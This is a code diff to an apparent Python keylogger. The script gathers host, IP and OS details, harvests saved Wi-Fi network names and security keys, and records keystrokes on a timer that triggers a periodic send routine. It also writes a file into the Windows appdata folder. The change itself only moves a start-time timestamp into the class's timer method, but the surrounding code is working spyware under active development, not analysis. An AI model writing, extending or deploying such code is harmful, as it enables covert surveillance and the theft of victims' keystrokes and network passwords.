@@ -67,7 +67,6 @@ try:
      host_ip    = socket.gethostbyname(host_name)
 except socket.gaierror: 
     pass
-time_date  = now = datetime.datetime.now()
 os_name    = platform.system()
 os_release = platform.release()
                                          
@@ -136,7 +135,6 @@ print2SSID          =   'Interface Wi-Fi        ..........| '+str(ssid2)
 print2password      =   'Security key           ..........| '+str(password2)
 print3SSID          =   'Interface Wi-Fi        ..........| '+str(ssid3)
 print3password      =   'Security key           ..........| '+str(password3)
-print_time          =   'Starting Time          ..........| '+str(time_date)
 print_line          =   '='*40
 print_info          =   'Wifi Info              .........| No WiFi InterFace Found'
 
@@ -160,7 +158,6 @@ class Keylogger:
                  global print_local_ip
                  global print_os_name
                  global print_os_re
-                 global print_time
                  global print_line
                  global host_name
                  global print_SSID
@@ -232,6 +229,8 @@ class Keylogger:
              self.log = " "
              timer = threading.Timer(self.time_count , self.START_SEND_ANDTIME)
              timer.start()
+             self.time_date  = now = datetime.datetime.now()
+             self.print_time          =   'Starting Time          ..........| '+str(self.time_date)
              if 'None'in ssid1 and  'None'in password1 and 'None'in ssid2\
                         and  'None' in password2 and 'None' in  ssid3 and 'None' in password3:
                             with open (os.environ["appdata"]+'\\VHost','w',encoding="utf-8")as file0:
